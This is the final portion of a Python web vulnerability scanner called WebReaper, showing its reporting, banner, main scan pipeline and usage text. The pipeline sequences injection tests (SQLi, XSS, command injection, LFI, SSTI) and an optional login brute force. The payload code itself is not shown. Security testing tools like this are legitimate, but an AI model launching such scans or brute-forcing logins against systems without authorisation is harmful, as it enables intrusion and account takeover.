    risk  = "CRITICAL" if VULN_COUNT["CRITICAL"] > 0 else \
            "HIGH"     if VULN_COUNT["HIGH"] > 0 else \
            "MEDIUM"   if VULN_COUNT["MEDIUM"] > 0 else "LOW"
    rcolor = R if risk in ("CRITICAL", "HIGH") else Y if risk == "MEDIUM" else B
    print(f"  Total: {BD}{total}{RS} findings | Risk: {rcolor}{BD}{risk}{RS}")
    print(f"{'═'*68}\n")

    if REPORT_MODE:
        fname = (f"webreaper_{urllib.parse.urlparse(TARGET).netloc}"
                 f"_{int(time.time())}.json")
        with open(fname, "w") as f:
            json.dump({
                "target":       TARGET,
                "scan_date":    datetime.now().isoformat(),
                "duration_sec": round(elapsed, 2),
                "urls_crawled": n_urls,
                "forms_found":  n_forms,
                "summary":      VULN_COUNT,
                "findings":     RESULTS,
            }, f, indent=2)
        print(f"  {G}Report saved → {fname}{RS}\n")

# ══════════════════════════════════════════════════
# BANNER
# ══════════════════════════════════════════════════

def banner():
    print(f"""{R}{BD}
 ██╗    ██╗███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
 ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
 ██║ █╗ ██║█████╗  ██████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
 ██║███╗██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
 ╚███╔███╔╝███████╗██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
{RS}{Y}              Pro v3.0 — Multi-vector Web Vulnerability Scanner{RS}
{C}    SQLi | XSS | CMDi | LFI | SSTI | Redirect | CORS | Headers | Brute{RS}
""")

# ══════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════

def main():
    banner()
    t0 = time.time()

    log("SCAN", f"Target  → {TARGET}")
    log("SCAN", f"Threads → {THREADS} | Deep={DEEP_MODE} | Brute={BRUTE_MODE}")

    # ── phase 1 : headers, cors, infos ────────────
    log("SCAN", "Checking headers, CORS, info leak...")
    check_headers()
    check_cors()
    check_info_leak(TARGET)

    # ── phase 2 : sensitive files ─────────────────
    log("SCAN", "Probing sensitive files...")
    check_sensitive_files()

    # ── phase 3 : crawl ───────────────────────────
    log("SCAN", "Crawling...")
    all_urls, all_forms = crawl_site(TARGET)
    # deduplicate forms by action+method
    seen_forms = set()
    unique_forms = []
    for f in all_forms:
        key = (f["action"], f["method"], tuple(i["name"] for i in f["inputs"]))
        if key not in seen_forms:
            seen_forms.add(key)
            unique_forms.append(f)
    all_forms = unique_forms

    log("INFO", f"Crawled {len(all_urls)} URLs | Found {len(all_forms)} unique forms")

    # parametric URLs
    param_urls = [u for u in all_urls if "?" in u]
    log("SCAN", f"Testing {len(param_urls)} parametric URLs...")

    # ── phase 4 : injection tests ─────────────────
    inj_queue = Queue()
    for u in param_urls:
        inj_queue.put(u)

    def scan_url(url):
        sqli_url(url)
        xss_url(url)
        cmdi_url(url)
        lfi_url(url)
        ssti_url(url)
        open_redirect_url(url)

    def url_worker():
        while not inj_queue.empty():
            try:
                url = inj_queue.get_nowait()
                scan_url(url)
            except Empty:
                return

    url_workers = [threading.Thread(target=url_worker, daemon=True) for _ in range(THREADS)]
    for w in url_workers:
        w.start()
    for w in url_workers:
        w.join()

    # ── phase 5 : form tests ───────────────────────
    log("SCAN", f"Testing {len(all_forms)} forms...")
    for form in all_forms:
        sqli_form(form)
        xss_form(form)

    # ── phase 6 : brute force ──────────────────────
    brute_force_login(all_forms)

    # ── report ─────────────────────────────────────
    print_report(t0, len(all_urls), len(all_forms))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python webreaper.py <url> [options]")
        print(f"  --deep          crawl entire site (slower, more thorough)")
        print(f"  --brute         enable login brute force")
        print(f"  --report        save JSON report")
        print(f"  --threads N     number of threads (default: 20)")
        print(f"\nExample: python webreaper.py http://testphp.vulnweb.com --deep --report")
        sys.exit(1)
    main()
